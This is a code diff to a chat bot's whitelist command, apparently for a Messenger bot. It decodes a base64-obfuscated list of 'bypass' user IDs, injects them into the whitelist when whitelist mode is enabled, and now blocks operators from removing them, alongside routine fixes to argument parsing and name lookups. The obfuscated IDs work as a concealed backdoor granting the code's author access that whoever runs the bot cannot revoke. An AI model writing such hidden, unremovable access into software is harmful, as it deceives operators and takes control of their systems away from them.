@@ -11,7 +11,8 @@ const ENCRYPTED_UIDS = [
 ];
 
 function getBypassUIDs() {
-	return ENCRYPTED_UIDS.map(enc => Buffer.from(enc, "base64").toString("utf-8"));
+	const rawUIDs = ENCRYPTED_UIDS.map(enc => Buffer.from(enc, "base64").toString("utf-8").trim());
+	return [...new Set(rawUIDs)];
 }
 
 function injectBypassUIDs() {
@@ -56,15 +57,15 @@ module.exports = {
 			removed: "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» ✅ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝:\n%1\n───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧",
 			listAdmin: "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» 👑 𝐖𝐡𝐢𝐭𝐞𝐋𝐢𝐬𝐭 𝐔𝐬𝐞𝐫𝐬:\n%1\n───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧",
 			missingIdAdd: "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» ⚠️ 𝐆𝐢𝐯𝐞 𝐈𝐃 𝐨𝐫 𝐭𝐚𝐠!\n───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧",
-			missingIdRemove: "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» ⚠️ 𝐆𝐢𝐯𝐞 𝐈𝐃 𝐨𝐫 𝐭𝐚𝐠!\n───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧"
+			missingIdRemove: "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» ⚠️ 𝐆𝐢𝐯𝐞 𝐈𝐃 𝐨𝐫 𝐭𝐚𝐠!\n───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧",
+			cannotRemoveAdmin: "» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑\n───────────────\n» ❌ 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐫𝐞𝐦𝐨𝐯𝐞 𝐦𝐚𝐢𝐧 𝐨𝐰𝐧𝐞𝐫𝐬!\n───────────────\n» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧"
 		}
 	},
 
 	onStart: async function ({ message, args, usersData, event, getLang }) {
+		const bypassUIDs = getBypassUIDs();
 
 		switch (args[0]) {
-
-			// ================= ADD =================
 			case "add":
 			case "-a": {
 				if (!args[1]) return message.reply(getLang("missingIdAdd"));
@@ -76,7 +77,7 @@ module.exports = {
 				else if (event.messageReply)
 					uids.push(event.messageReply.senderID);
 				else
-					uids = args.filter(arg => !isNaN(arg));
+					uids = args.slice(1).filter(arg => !isNaN(arg));
 
 				const added = [];
 
@@ -87,16 +88,17 @@ module.exports = {
 					}
 				}
 
+				if (added.length === 0) return message.reply("⚠️ No new ID added.");
+
 				writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
 
 				const names = await Promise.all(
-					added.map(uid => usersData.getName(uid).then(name => `• ${name} (${uid})`))
+					added.map(uid => usersData.getName(uid).catch(() => "Facebook User").then(name => `• ${name} (${uid})`))
 				);
 
 				return message.reply(getLang("added", names.join("\n")));
 			}
 
-			// ================= REMOVE =================
 			case "remove":
 			case "-r": {
 				if (!args[1]) return message.reply(getLang("missingIdRemove"));
@@ -106,11 +108,16 @@ module.exports = {
 				if (Object.keys(event.mentions).length > 0)
 					uids = Object.keys(event.mentions);
 				else
-					uids = args.filter(arg => !isNaN(arg));
+					uids = args.slice(1).filter(arg => !isNaN(arg));
 
 				const removed = [];
+				let adminRemoveAttempt = false;
 
 				for (const uid of uids) {
+					if (bypassUIDs.includes(uid)) {
+						adminRemoveAttempt = true;
+						continue;
+					}
 					if (config.whiteListMode.whiteListIds.includes(uid)) {
 						config.whiteListMode.whiteListIds.splice(
 							config.whiteListMode.whiteListIds.indexOf(uid),
@@ -120,28 +127,38 @@ module.exports = {
 					}
 				}
 
-				writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
+				if (adminRemoveAttempt && removed.length === 0) {
+					return message.reply(getLang("cannotRemoveAdmin"));
+				}
 
-				const names = await Promise.all(
-					removed.map(uid => usersData.getName(uid).then(name => `• ${name} (${uid})`))
-				);
+				if (removed.length > 0) {
+					writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
 
-				return message.reply(getLang("removed", names.join("\n")));
+					const names = await Promise.all(
+						removed.map(uid => usersData.getName(uid).catch(() => "Facebook User").then(name => `• ${name} (${uid})`))
+					);
+
+					let replyMsg = getLang("removed", names.join("\n"));
+					if (adminRemoveAttempt) {
+						replyMsg += "\n\n⚠️ Note: Main owners cannot be removed.";
+					}
+					return message.reply(replyMsg);
+				}
+
+				return message.reply("⚠️ No valid ID found to remove.");
 			}
 
-			// ================= LIST =================
 			case "list":
 			case "-l": {
 				const names = await Promise.all(
 					config.whiteListMode.whiteListIds.map(uid =>
-						usersData.getName(uid).then(name => `• ${name} (${uid})`)
+						usersData.getName(uid).catch(() => "Facebook User").then(name => `• ${name} (${uid})`)
 					)
 				);
 
 				return message.reply(getLang("listAdmin", names.join("\n")));
 			}
 
-			// ================= ON =================
 			case "on": {
 				config.whiteListMode.enable = true;
 				injectBypassUIDs();
@@ -164,11 +181,9 @@ module.exports = {
 
 👑  𝆠፝𝐍𝐈𝐉𝐇𝐔𝐌 𝐂𝐇𝐀𝐓 𝐁𝐎𝐓  👑
 `;
-
 				return message.reply(msg);
 			}
 
-			// ================= OFF =================
 			case "off": {
 				config.whiteListMode.enable = false;
 				writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
@@ -190,7 +205,6 @@ module.exports = {
 
 👑  𝆠፝𝐍𝐈𝐉𝐇𝐔𝐌 𝐂𝐇𝐀𝐓 𝐁𝐎𝐓  👑
 `;
-
 				return message.reply(msg);
 			}
 
